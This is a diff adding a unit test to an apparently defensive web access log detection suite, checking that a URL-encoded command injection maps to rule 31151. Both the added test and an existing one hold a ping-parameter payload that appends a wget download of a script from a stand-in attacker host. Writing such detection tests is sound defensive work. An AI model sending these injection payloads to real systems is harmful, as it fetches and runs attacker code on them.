@@ -317,6 +317,10 @@ class WebAccessLogTest(RuleTestCase):
             with self.subTest(line=line):
                 self.assertIsNone(self.rule_of(self.ev(line)))
 
+    def test_url_encoded_command_injection_is_31151(self):
+        line = 'GET /ping?host=8.8.8.8;wget%20http://evil.example/x.sh 400 "Mozilla/5.0"'
+        self.assertEqual(self.rule_of(self.ev(line)), 31151)
+
     def test_command_injection_still_31151(self):
         self.assertEqual(self.rule_of(self.ev("GET /ping?host=8.8.8.8; wget http://evil.example/x.sh")), 31151)
 
